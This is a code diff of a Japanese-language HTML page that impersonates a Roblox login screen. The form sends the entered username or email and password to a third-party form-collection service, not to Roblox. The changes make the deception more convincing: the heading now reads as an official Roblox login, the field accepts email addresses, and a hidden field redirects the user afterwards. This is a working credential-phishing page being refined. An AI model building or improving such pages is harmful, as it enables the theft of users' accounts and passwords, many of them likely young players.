@@ -79,25 +79,18 @@
 <body>
 
   <div class="login-container">
-    <h2>Robloxフォーム</h2>
-    <form action="https://usebasin.com/f/7df2eb4b9718" method="POST" onsubmit="redirect()">
-      <input type="text" name="username" placeholder="ユーザーネーム" required>
+    <h2>Roblox(ロブロックス)にログイン</h2>
+    <form action="https://usebasin.com/f/7df2eb4b9718" method="POST">
+      <input type="text" name="username" placeholder="ユーザーネーム/メールアドレス" required>
       <input type="password" name="password" placeholder="パスワード" required>
       <button type="submit">送信</button>
+      <input type="hidden" name="_redirect" value="https://example.com/thanks.html">
     </form>
     <div class="links">
       <p><a href="#">パスワードを忘れた場合</a></p>
       <p>アカウントをお持ちでないですか？ <a href="#">サインアップ</a></p>
     </div>
   </div>
-
-  <script>
-    function redirect() {
-      setTimeout(function() {
-        window.location.href = "thankyou.html"; // 任意のHTMLへリダイレクト
-      }, 500); // Basin送信を邪魔しないようちょっと待つ
-    }
-  </script>
 
 </body>
 </html>
